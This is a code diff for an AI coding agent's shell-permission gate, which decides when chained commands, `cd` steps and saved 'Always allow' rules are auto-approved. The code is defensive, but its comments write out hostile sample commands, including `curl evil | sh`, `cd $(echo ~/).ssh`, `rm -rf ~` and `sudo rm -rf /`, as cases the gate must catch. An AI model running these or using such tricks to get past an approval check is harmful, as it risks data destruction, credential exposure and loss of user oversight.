+  for (; args[i]?.startsWith('-'); i++) {
+    if (args[i] === '--') {
+      i++
+      break
+    }
+    if (prog !== 'cd' || !/^-[LP]+$/.test(args[i])) return false // `-`, `-n`, `-1`, …
+  }
+  if (args.length - i !== 1) return false
+  const dir = args[i]
+  if (!dir || /^[-+]/.test(dir) || SHELL_EXPANDING_CHAR.test(dir)) return false
+  if (dir.startsWith('~') && dir !== '~' && !dir.startsWith('~/')) return false
+  return !process.env.CDPATH || /^(?:\/|~|\.\.?(?:\/|$))/.test(dir)
+}
+
+/**
+ * Whether a sub-command is a directory change {@link matchShellRule} may skip: a `cd` or
+ * `pushd` that {@link namesItsDirectory}, into a directory the escape check finds
+ * inside `roots` (a relative one is read against the workspace root, as that check
+ * reads every relative path). Without `roots`, only the first half is judged. Never one
+ * a substitution was lifted out of (see {@link ShellSegment.lifted}): its output joins
+ * the directory (`cd $(echo ~/).ssh`, `cd src$(echo /../..)`) where no check sees it.
+ */
+function isWorkspaceCwdChange(segment: ShellSegment, roots?: string[]): boolean {
+  if (segment.lifted) return false
+  const command = normalizeShellCommand(segment.text)
+  if (!namesItsDirectory(tokenizeShellCommand(command))) return false
+  return roots === undefined || !shellReferencesExternalPath(command, roots)
 }
 
 /**
@@ -803,15 +1227,19 @@ function isCwdOnly(command: string): boolean {
  * which prompts for shell). This stops a narrow allow-rule (e.g. `git status*`)
  * from auto-approving `git status && curl evil | sh`.
  *
- * A pure `cd`/`pushd`/`popd` sub-command *into the workspace* carries no privilege of
- * its own — a fresh shell resets the cwd on the next call — so an *unmatched* one does
- * not block auto-approval. That lets a generalized rule like `npm install` cover the
- * whole of `cd /repo && npm install` without also needing a rule for the `cd` (agents
- * prepend one constantly). A `cd` that ESCAPES the workspace is NOT skipped: it stays
- * gated so `cd ~/.ssh && <allowed-cmd>` still prompts rather than slipping past the
- * workspace-escape tripwire on the strength of the allowed command alone. A command
- * that is ONLY directory changes still falls through to the policy; an explicit deny
- * on the `cd` still denies.
+ * A `cd` or `pushd` sub-command that provably lands *in the workspace* changes nothing a
+ * rule guards (what runs after it, in this call or a later one that keeps the cwd,
+ * still runs in the workspace), so an *unmatched* one does not block auto-approval.
+ * That lets a generalized rule like `npm install` cover the whole of
+ * `cd /repo && npm install` without also needing a rule for the `cd` (agents prepend
+ * one constantly). Provably means its words name the directory and that directory is
+ * in the workspace (see {@link isWorkspaceCwdChange}). Any other directory change stays
+ * gated: one that ESCAPES the workspace, so `cd ~/.ssh && <allowed-cmd>` still prompts
+ * rather than slipping past the workspace-escape tripwire on the strength of the
+ * allowed command alone, and one whose directory bash finds elsewhere (a bare `cd`,
+ * `cd -`, `popd`, `cd $PWD/..`, `cd .[.]`), where the tripwire can't see where it
+ * lands. A command that is ONLY skipped directory changes still falls through to the
+ * policy; an explicit deny on the `cd` still denies.
  */
 export function matchShellRule(
   rules: PermissionRule[],
@@ -821,12 +1249,12 @@ export function matchShellRule(
   let allAllow = true
   let anyAsk = false
   let sawGated = false
-  for (const seg of splitShellCommand(command)) {
-    const norm = normalizeShellCommand(seg)
+  for (const seg of shellSegments(command)) {
+    const norm = normalizeShellCommand(seg.text)
     const action = matchOneShell(rules, norm)
     if (action === 'deny') return 'deny' // a denied sub-command denies the whole call
-    // A bare cd that stays inside the workspace is plumbing, not a gated command.
-    if (action == null && isCwdOnly(norm) && !shellReferencesExternalPath(norm, roots)) continue
+    // A directory change that provably stays in the workspace is plumbing, not a gated command.
+    if (action == null && isWorkspaceCwdChange(seg, roots)) continue
     sawGated = true
     if (action === 'allow') continue
     if (action === 'ask') anyAsk = true
@@ -944,8 +1372,12 @@ function isCountOnlyPager(tokens: string[]): boolean {
  * - The command is split into its chained sub-commands (the same split the matcher
  *   uses), so `cd /repo && npm install foo` yields a rule for `npm install`, not the
  *   whole line.
- * - Pure directory-change sub-commands (`cd`/`pushd`/`popd`) are dropped — they carry
- *   no privilege and only add noise.
+ * - A directory change the matcher skips (a `cd <dir>` into the workspace, see
+ *   {@link isWorkspaceCwdChange}) is dropped: it needs no rule and only adds noise. Any
+ *   other (a bare `cd`, `cd -`, `popd`, `cd $DIR`, and, given the run's `roots`, a `cd`
+ *   out of them) is kept whole, since the matcher gates it, and saved exact (see
+ *   {@link shellAllowRule}). Without `roots` (cleaning up saved rules), a `cd` that
+ *   names its directory is dropped wherever it points.
  * - A sub-command shaped `<program> <verb> …` where `<verb>` is a bare word (e.g.
  *   `git status`, `npm install`) generalizes to that two-token prefix, so repeated
  *   invocations with different trailing arguments collapse onto one rule.
@@ -953,7 +1385,19 @@ function isCountOnlyPager(tokens: string[]): boolean {
  *   env-prefixed command, or a command wrapper (`sudo`/`env`/`xargs`/… — see
  *   {@link COMMAND_WRAPPERS}) whose second token is another program — is kept verbatim,
  *   so raw operations like `cat x`, `rm -rf y`, or `sudo rm -rf z` are NOT silently
- *   broadened to `cat`/`rm`/`sudo rm`.
+ *   broadened to `cat`/`rm`/`sudo rm`. A program spelled with `*` (`./*.sh run`, or
+ *   `$'\x2a'` decoded) is kept verbatim too, since its two-token prefix would be a glob
+ *   over other programs.
+ *   Only a verbatim pattern can therefore hold `*`, and that one is saved exact (see
+ *   {@link shellAllowRule}). So is a program whose quoting or escaping the prefix would
+ *   drop (`'~/bin/x' status`, `\~/bin/x status`, `"my tool" status`): written bare, the
+ *   prefix would name a different program, and would not cover the command it was
+ *   saved for.
+ * - The program and verb are the words bash runs (see {@link tokenizeShellCommand}), so
+ *   a quoted or escaped `cd` or wrapper is the one it runs: `\sudo rm -rf x` stays
+ *   verbatim rather than saving a `\sudo rm` prefix that covers `sudo rm -rf /`, and
+ *   `"cd"k deploy` is the command `cdk deploy`, not a dropped `cd`. A word shaped like
+ *   `VAR=value` once its quotes come off (`F"OO"=1`) stays verbatim too.
  *
  * - A `head`/`tail` whose arguments are only line/byte counts (`tail -60`, `head -c 4000`,
  *   `head -n 30`) collapses to the bare program: it's slicing piped output, and keeping
@@ -963,17 +1407,27 @@ function isCountOnlyPager(tokens: string[]): boolean {
  * Used only for the ALLOW case; a deny is always stored exactly (a broadened deny is
  * dangerous). Never returns an empty list.
  */
-export function shellRulePatterns(command: string): string[] {
+export function shellRulePatterns(command: string, roots?: string[]): string[] {
   const patterns = new Set<string>()
-  for (const seg of splitShellCommand(command)) {
-    const norm = normalizeShellCommand(seg)
+  for (const seg of shellSegments(command)) {
+    const norm = normalizeShellCommand(seg.text)
     const tokens = tokenizeShellCommand(norm)
     const prog = tokens[0]
-    if (!prog || CWD_BUILTINS.has(prog)) continue
+    // An empty program (`'' rm -rf x`) is still a sub-command to cover, not one to drop.
+    if (prog === undefined || isWorkspaceCwdChange(seg, roots)) continue
     const verb = tokens[1]
-    if (isCountOnlyPager(tokens)) {
+    if (CWD_BUILTINS.has(prog)) {
+      patterns.add(norm)
+    } else if (isCountOnlyPager(tokens)) {
       patterns.add(prog)
-    } else if (!ENV_ASSIGN.test(prog) && !COMMAND_WRAPPERS.has(prog) && verb && SUBCOMMAND_VERB.test(verb)) {
+    } else if (
+      !ENV_ASSIGN.test(prog) &&
+      !COMMAND_WRAPPERS.has(prog) &&
+      !holdsShellStar(prog) &&
+      verb &&
+      SUBCOMMAND_VERB.test(verb) &&
+      shellAllowMatches(`${prog} ${verb}`, norm)
+    ) {
       patterns.add(`${prog} ${verb}`)
     } else {
       patterns.add(norm)
@@ -984,17 +1438,95 @@ export function shellRulePatterns(command: string): string[] {
 }
 
 /**
+ * Whether a shell pattern holds a `*` that an allow would read as its wildcard: one
+ * written out, or one a `$'...'` escape spells (`rm $'\x2a'`).
+ */
+function holdsShellStar(s: string): boolean {
+  return s.includes('*') || literalShellUnits(s).some(isShellStarUnit)
+}
+
+/**
+ * The `run_shell` allow rule saved for one pattern from {@link shellRulePatterns}. A
+ * pattern holding `*` (see {@link holdsShellStar}) is a sub-command kept verbatim, and
+ * the matcher would read that `*` as a wildcard: approving `rm *` would allow
+ * `rm -rf ~`, and approving `find . -name "*.ts"` would allow
+ * `find . -name x -delete -name y.ts`. So it is `exact`, covering the approved
+ * sub-command only. So is a directory change: as a prefix, `cd` would cover every
+ * `cd` and `cd -` would cover `cd - x`. Every other pattern keeps its prefix meaning
+ * (`git status` also covers `git status -s`).
+ */
+function shellAllowRule(match: string): PermissionRule {
+  return holdsShellStar(match) || isCwdOnly(match)
+    ? { action: 'allow', tool: 'run_shell', match, exact: true }
+    : { action: 'allow', tool: 'run_shell', match }
+}
+
+/** The argument(s) {@link permissionSubject} reads a tool's subject from. */
+function subjectArgKeys(toolName: string): string[] {
+  if (toolName === 'run_shell') return ['command']
+  if (toolName === 'web_fetch') return ['url']
+  if (toolName === 'web_search') return ['query']
+  if (toolName.startsWith('mcp__')) return []
+  return ['path', 'pattern']
+}
+
+/**
+ * The rule(s) an "Always allow" / "Always deny" on a call persists, each for the
+ * call's own tool.
+ *
+ * - An ALLOW on `run_shell` stores generalized per-sub-command prefixes (see
+ *   {@link shellRulePatterns}, given the run's `roots` so a `cd` out of them is kept),
+ *   except that a sub-command kept verbatim and holding `*`, or changing directory, is
+ *   exact (see {@link shellAllowRule}); a shell deny stays as typed (a broadened deny
+ *   is risky).
+ * - Any other ALLOW is `exact` (see {@link PermissionRule.exact}): it covers the one
+ *   path, URL, or query the user approved. Saved as a glob instead, a model-chosen
+ *   path would widen it: a file named `*` would allow every write, and a directory
+ *   path would allow everything inside it.
+ * - `apply_patch` stores one rule per file the patch touches, so a later patch is
+ *   auto-approved only when every file it touches is covered (see {@link matchRule}).
+ *   A patch that names no file stores nothing: the only pattern left would be `*`,
+ *   which would allow (or deny) every patch to every file.
+ * - An allow on a call that passes its subject argument blank (`path: ''`) stores
+ *   nothing, for the same reason.
+ * - A DENY stores the subject as a glob, so it can only be broader than the call
+ *   (tightening). A tool whose calls carry no subject argument at all stores `*` (the
+ *   rule then names the tool itself).
+ */
+export function persistedRules(
+  action: 'allow' | 'deny',
+  toolName: string,
+  args: Record<string, unknown>,
+  roots?: string[]
+): PermissionRule[] {
+  const exact = action === 'allow' && toolName !== 'run_shell'
+  const rule = (match: string): PermissionRule =>
+    exact ? { action, tool: toolName, match, exact: true } : { action, tool: toolName, match }
+  if (toolName === 'apply_patch') return patchSubjectPaths(permissionSubject(toolName, args)).map(rule)
+  const subject = permissionSubject(toolName, args)
+  if (subject.trim()) {
+    if (action === 'allow' && toolName === 'run_shell') return shellRulePatterns(subject, roots).map(shellAllowRule)
+    return [rule(subject)]
+  }
+  if (action === 'allow' && subjectArgKeys(toolName).some((k) => typeof args[k] === 'string')) return []
+  return [{ action, tool: toolName, match: subject || '*' }]
+}
+
+/**
  * Whether the current `rules` already resolve `sample` (a command, path, URL, or query
  * that a new rule would target) to ALLOW. Used to skip persisting a rule an existing,
  * broader rule already covers, so "Always allow" never piles up redundant entries.
+ * Pass the run's `roots`, the same ones the gate matches with, so a relative path
+ * resolves to the file the gate would check (without them it anchors at the cwd).
  */
 export function alreadyAllowedAsRule(
   rules: PermissionRule[],
   toolName: string,
-  sample: string
+  sample: string,
+  roots: string[] = []
 ): boolean {
   if (toolName === 'run_shell') return matchOneShell(rules, normalizeShellCommand(sample)) === 'allow'
-  return matchOne(rules, toolName, sample) === 'allow'
+  return matchOne(rules, toolName, sample, roots) === 'allow'
 }
 
 /** Shell allow patterns that can never match a real command (see cleanupPermissionRules). */
@@ -1027,6 +1559,14 @@ function isDeadShellPattern(match: string): boolean {
  *   and a bare fd number (`1`, not a command). Also drops rules that are pure shell
  *   scaffolding (`done`, `fi`, `for f`), and re-generalizes keyword-prefixed ones
  *   (`do wc` becomes `wc`), since segments are matched with that scaffolding stripped.
+ * - Keeps every `exact` rule exact (it is never re-generalized), and never treats one
+ *   as covering a broader rule: an exact `src` allows only `src`, so a later glob or
+ *   prefix `src` allow is not redundant after it.
+ * - Saves a sub-command it pulls out of a `run_shell` allow exact when it holds `*`,
+ *   as "Always allow" does (see {@link shellAllowRule}): `cd /r && rm *` becomes an
+ *   exact `rm *`, not a glob that allows `rm -rf ~`. A rule that is already its own
+ *   pattern (`rm *`, `git *`) is left as it is: nothing records whether "Always allow"
+ *   saved it or the user typed it as a glob on purpose, and the two read the same.
  *
  * Every drop removes an allow, so the result is never looser than the input. Deny/ask
  * rules and non-shell rules are preserved verbatim (only exact dedupe applies). Pure
@@ -1054,18 +1594,24 @@ export function cleanupPermissionRules(rules: PermissionRule[]): PermissionRule[
   // NUL separates the fields because it cannot appear in any of them. Write it as an
   // escape, never as a raw byte: a literal NUL makes grep and ripgrep treat the whole
   // file as binary and skip it.
-  const key = (r: PermissionRule): string => `${r.action}\u0000${r.tool}\u0000${r.match}`
+  const key = (r: PermissionRule): string =>
+    `${r.action}\u0000${r.tool}\u0000${r.match}\u0000${r.exact ? 'exact' : ''}`
   for (const r of rules) {
     if (isShellAllow(r) && isDeadShellPattern(r.match ?? '')) continue
     let expanded: PermissionRule[] = [r]
-    if (isShellAllow(r)) {
+    if (isShellAllow(r) && !r.exact) {
       const pats = shellRulePatterns(r.match ?? '')
-      // Keep the rule exact if generalizing it could shadow a narrower deny.
-      expanded = pats.some(wouldShadowDeny) ? [r] : pats.map((match) => ({ ...r, match }))
+      const own = normalizeShellCommand(r.match ?? '')
+      // Keep the rule as it is if generalizing it could shadow a narrower deny.
+      expanded = pats.some(wouldShadowDeny)
+        ? [r]
+        : pats.map((match) => (match === own ? { ...r, match } : { ...r, ...shellAllowRule(match) }))
     }
     for (const e of expanded) {
       if (seen.has(key(e))) continue
-      const priorAllows = out.filter((x) => x.action === 'allow')
+      // The coverage test matches e's pattern as one subject, which only proves an
+      // exact rule redundant: a broader e also covers what lies past that subject.
+      const priorAllows = out.filter((x) => x.action === 'allow' && (e.exact || !x.exact))
       if (e.action === 'allow' && alreadyAllowedAsRule(priorAllows, e.tool, e.match ?? '')) continue
       seen.add(key(e))
       out.push(e)
